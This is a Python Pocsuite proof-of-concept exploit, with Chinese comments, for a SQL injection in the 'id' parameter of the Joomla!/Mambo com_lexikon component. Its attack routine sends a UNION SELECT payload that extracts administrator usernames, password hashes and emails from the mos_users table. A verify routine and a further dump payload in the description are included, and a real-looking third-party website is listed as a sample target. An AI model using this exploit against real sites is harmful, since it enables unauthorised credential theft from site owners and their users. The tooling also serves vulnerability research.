#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '84553'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2011-02-16'
    createDate = '2016-01-25'
    updateDate = '2016-01-25'
    references = ['http://www.seebug.org/vuldb/ssvid-84553']
    name = 'Joomla! and Mambo com_lexikon Component - &#39;id&#39; Parameter SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla! and Mambo com_lexikon Component'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        Joomla! and Mambo com_lexikon组件的参数 id 过滤不严，导致出现SQL注入漏洞。

        该漏洞的POC格式如下：
        http://www.example.com/index.php?option=com_lexikon&id=-1/**/union/**/select
        /**/concat(username,0x3a,password),concat(username,0x3a,password),concat
        (username,0x3a,password) from mos_users--+ 
    '''
    samples = ['http://www.deutsche-handwerker.info']

    def _attack(self):
        #利用SQL注入读取joomla管理员信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_lexikon&id='
        #利用Union方式读取信息
        payload=("-1 union select 1,concat(0x247e7e7e24,username"
            ",0x2a2a2a,password,0x2a2a2a,email,0x247e7e7e24),3 from mos_users limit 0,1--+")
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串
        if '$~~~$' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['AdminInfo']={}
                #用户名
                result['AdminInfo']['Username']=match.group(1)
                #密码
                result['AdminInfo']['Password']=match.group(2)
                #邮箱
                result['AdminInfo']['Email']=match.group(3)
        return self.parse_output(result)

    def _verify(self):
        #通过计算md5(3.1415)的值，来验证SQL注入
        result = {}
        #访问的地址
        exploit='/index.php?option=com_lexikon&id='
        #利用union的方式（计算md5(3.1415)）
        payload="-1 union select 1,md5(3.1415),3--+"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
        if '63e1f04640e83605c1d177544a5a0488' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)